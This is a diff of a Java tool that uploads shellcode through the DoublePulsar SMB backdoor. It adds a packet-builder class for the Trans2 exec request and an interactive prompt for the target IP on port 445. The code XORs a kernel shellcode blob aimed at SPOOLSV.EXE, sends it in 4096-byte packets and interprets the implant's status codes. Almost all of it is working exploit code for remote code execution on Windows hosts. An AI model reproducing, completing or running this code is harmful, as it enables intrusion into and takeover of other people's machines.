@@ -3,10 +3,12 @@ import java.nio.ByteOrder;
 import java.io.InputStream;
 import java.io.OutputStream;
 import java.net.InetSocketAddress;
+import java.net.InetAddress;
+import java.util.Scanner;
 import java.net.Socket;
 import java.util.Arrays;
 
-public class UploadShellcode {
+public class Main {
 
     /* =========================
      * Raw bytecode blobs
@@ -128,9 +130,6 @@ public class UploadShellcode {
         return out;
     }
 
-
-
-
     /* =========================
      * Process hash function
      * ========================= */
@@ -162,7 +161,6 @@ public class UploadShellcode {
             return "x64 (64-bit)";
         }
     }
-
 
     /* =========================
      * Main logic
@@ -197,8 +195,133 @@ public class UploadShellcode {
                 .getShort() & 0xFFFF;
     }
 
+    static class SmbDoublePulsarExecPacket {
 
-    public static void main(String[] args) throws Exception {
+        public short SmbMessageType = 0x0000;
+        public short SmbMessageLength;
+
+        public byte[] ProtocolHeader = {(byte) 0xFF, 'S', 'M', 'B'};
+        public byte SmbCommand = 0x32;
+
+        public int NtStatus = 0x00000000;
+        public byte flags = 0x18;
+        public short flags2 = (short) 0xC007;
+
+        public short ProcessIDHigh = 0;
+        public byte[] signature = new byte[8];
+
+        public short reserved = 0;
+        public short TreeId;
+        public short ProcessID = (short) 0xFEFF;
+        public short UserID;
+        public short multipleID = 65;
+
+        // Trans2 header
+        public byte wordCount = 15;
+        public short totalParameterCount = 12;
+        public short totalDataCount = 0;
+        public short MaxParameterCount = 1;
+        public short MaxDataCount = 0;
+        public byte MaxSetupCount = 0;
+
+        public byte reserved1 = 0;
+        public short flags1 = 0;
+        public int timeout = 0x001a8925;          //FOR PING: 0x00EE3401;
+        public short reserved2 = 0;
+
+        public short ParameterCount = 12;
+        public short ParamOffset = 66;
+        public short DataCount;
+        public short DataOffset = 78;
+
+        public byte SetupCount = 1;
+        public byte reserved3 = 0;
+        public short subcommand = 0x000E;
+
+        public short ByteCount; //4109;
+        public byte padding = 0;
+
+        public byte[] SESSION_SETUP_PARAMETERS = new byte[12];
+
+        public byte[] SMB_PAYLOAD = new byte[4096];
+
+        public byte[] toBytes() {
+
+            ByteBuffer buf = ByteBuffer.allocate(4178);
+            buf.order(ByteOrder.LITTLE_ENDIAN);
+
+            buf.putShort(SmbMessageType);
+            buf.putShort(SmbMessageLength);
+
+            buf.put(ProtocolHeader);
+            buf.put(SmbCommand);
+
+            buf.putInt(NtStatus);
+            buf.put(flags);
+            buf.putShort(flags2);
+            buf.putShort(ProcessIDHigh);
+            buf.put(signature);
+
+            buf.putShort(reserved);
+            buf.putShort(TreeId);
+            buf.putShort(ProcessID);
+            buf.putShort(UserID);
+            buf.putShort(multipleID);
+
+            buf.put(wordCount);
+            buf.putShort(totalParameterCount);
+            buf.putShort(totalDataCount);
+            buf.putShort(MaxParameterCount);
+            buf.putShort(MaxDataCount);
+            buf.put(MaxSetupCount);
+
+            buf.put(reserved1);
+            buf.putShort(flags1);
+            buf.putInt(timeout);
+            buf.putShort(reserved2);
+
+            buf.putShort(ParameterCount);
+            buf.putShort(ParamOffset);
+            buf.putShort(DataCount);
+            buf.putShort(DataOffset);
+
+            buf.put(SetupCount);
+            buf.put(reserved3);
+            buf.putShort(subcommand);
+
+            buf.putShort(ByteCount);
+            buf.put(padding);
+
+            buf.put(SESSION_SETUP_PARAMETERS);
+            buf.put(SMB_PAYLOAD);
+
+            return buf.array();
+        }
+    }
+
+    public static void main(String[] args) throws Exception
+    {
+        //Test phase: Using a structure generate a Doublepulsar SMB Trans2 Exec Packet
+        SmbDoublePulsarExecPacket packet = new SmbDoublePulsarExecPacket();
+
+        packet.totalDataCount = (short) 4096;
+        packet.DataCount = (short) 4096;
+        packet.ByteCount = (short) 4109;
+        packet.TreeId = (short) 0x0008;
+        packet.UserID = (short) 0x0008;
+        //packet.SESSION_SETUP_PARAMETERS;
+        //packet.SMB_PAYLOAD;
+
+        //packet.SmbMessageLength = (short)(packet.toBytes().length - 4);
+        // Calculate dynamic length if needed
+        packet.SmbMessageLength = (short)(packet.toBytes().length - 4);
+
+        byte[] rawPacket = packet.toBytes();
+        hexdump(rawPacket, 16);
+        //out.write(rawPacket);
+
+
+        //build the shellcode
 
         /* build the shellcode */
         String procName = "SPOOLSV.EXE";
@@ -294,7 +417,11 @@ public class UploadShellcode {
          * Connection
          * ========================= */
 
-        String ip = "192.168.0.248";
+        //String ip = "192.168.0.248";
+        System.out.print("Enter IP address: ");
+        Scanner scanner = new Scanner(System.in);
+        String ip = scanner.nextLine();
+
         int port = 445;
         int timeoutMillis = 5000;
 
@@ -423,7 +550,7 @@ public class UploadShellcode {
             byte[] xorBytes = byteXor(modifiedKernelBytecode, key);
             //hexdump(xorBytes, 16);
 
-            int entireShellcodeSize = modifiedKernelBytecode.length;
+            //int entireShellcodeSize = modifiedKernelBytecode.length;
             //must pad the value to 4096
 
             System.out.println("Generating the parameters...");
@@ -445,7 +572,7 @@ public class UploadShellcode {
 
             byte[] offset = ByteBuffer.allocate(4)
                     .order(ByteOrder.LITTLE_ENDIAN)
-                    .putInt(0)
+                    .putInt(0000)
                     .array();
 
             /* =========================
@@ -457,6 +584,7 @@ public class UploadShellcode {
             System.arraycopy(entireSize, 0, parameters, 0, 4);
             System.arraycopy(chunkSize, 0, parameters, 4, 4);
             System.arraycopy(offset, 0, parameters, 8, 4);
+            hexdump(parameters, 16);
 
             /* =========================
              * XOR parameters
@@ -465,14 +593,16 @@ public class UploadShellcode {
             byte[] xorParameters = byteXor(parameters, key);
             hexdump(xorParameters, 16);
 
-
             /* =========================
              * Build TRANS2 exec packet
              * ========================= */
 
-            byte[] trans2ExecPacket = hexToBytes(
-                    "0000104eff534d4232000000001807c00000000000000000000000000008fffe000842000f0c000010010000000000000025891a0000000c00420000104e0001000e000d1000"
-            );
+            //implementation 2
+            /* Generate Doublepulsar Execution Packet */
+
+            //implementation 1
+
+            byte[] trans2ExecPacket = hexToBytes("0000104eff534d4232000000001807c00000000000000000000000000008fffe000842000f0c000010010000000000000025891a0000000c00420000104e0001000e000d1000");
 
             byte[] dopuExecPacket = Arrays.copyOf(trans2ExecPacket, trans2ExecPacket.length);
 
@@ -515,7 +645,7 @@ public class UploadShellcode {
 
             byte[] byteCount = ByteBuffer.allocate(2)
                     .order(ByteOrder.LITTLE_ENDIAN)
-                    .putShort((short) (4096 + 12))
+                    .putShort((short) (4096 + 12)) //changed from 12 ???
                     .array();
 
             // Update packet fields
@@ -557,14 +687,11 @@ public class UploadShellcode {
 
             System.arraycopy(dopuExecPacket, 0, finalPacket, 0, dopuExecPacket.length);
             System.arraycopy(xorParameters, 0, finalPacket, dopuExecPacket.length, xorParameters.length);
-            System.arraycopy(xorBytes, 0, finalPacket,
-                    dopuExecPacket.length + xorParameters.length,
-                    xorBytes.length
-            );
+            System.arraycopy(xorBytes, 0, finalPacket, dopuExecPacket.length + xorParameters.length, xorBytes.length);
 
-            System.out.println("hex content of the hex packet");
-            hexdump(finalPacket, 16);
-            System.out.println("Length of the final hex packet " + finalPacket.length);
+            //System.out.println("hex content of the hex packet");
+            //hexdump(finalPacket, 16);
+            System.out.println("Total Length of the final hex packet " + finalPacket.length);
 
             /* =========================
              * Send packet
@@ -586,23 +713,21 @@ public class UploadShellcode {
                 System.out.println("DOPU returned: 0xC0000002 - STATUS_NOT_IMPLEMENTED!");
             }
 
-            if ((smbResponse[34]) == 82) {
-                System.out.println("DOPU returned:  Success!\n");
-            } else if ((smbResponse[34]) == 98) {
-                System.out.println("DOPU returned:  Invalid parameters!\n");
-            } else if ((smbResponse[34]) == 114) {
-                System.out.println("DOPU returned:  Allocation failure!\n");
+            if ((smbResponse[34]  & 0xFF ) == 82) {
+                System.out.println("DOPU returned:  Success!");
+            } else if ((smbResponse[34]  & 0xFF ) == 98) {
+                System.out.println("DOPU returned:  Invalid parameters!");
+            } else if ((smbResponse[34]  & 0xFF ) == 114) {
+                System.out.println("DOPU returned:  Allocation failure!");
             } else {
-                System.out.println("DOPU didn't succeed\n");
+                System.out.println("DOPU didn't succeed");
             }
 
             /* =========================
              * Tree disconnect
              * ========================= */
 
-            byte[] treeDisconnect = hexToBytes(
-                    "00000023ff534d4271000000001807c00000000000000000000000000008fffe00084100000000"
-            );
+            byte[] treeDisconnect = hexToBytes("00000023ff534d4271000000001807c00000000000000000000000000008fffe00084100000000");
 
             treeDisconnect[28] = treeConnectResponse[28];
             treeDisconnect[29] = treeConnectResponse[29];
@@ -617,8 +742,7 @@ public class UploadShellcode {
              * Logoff
              * ========================= */
 
-            byte[] logoff = hexToBytes( "00000027ff534d4274000000001807c00000000000000000000000000008fffe0008410002ff0027000000"
-            );
+            byte[] logoff = hexToBytes( "00000027ff534d4274000000001807c00000000000000000000000000008fffe0008410002ff0027000000");
 
             logoff [28] = treeConnectResponse[28];
             logoff [29] = treeConnectResponse[29];
@@ -631,7 +755,7 @@ public class UploadShellcode {
 
             socket.close();
         }  else {
-            System.out.print("No doublepulsar detected!\n");
+            System.out.print("No DoublePulsar detected!\n");
             socket.close();
         }
     }
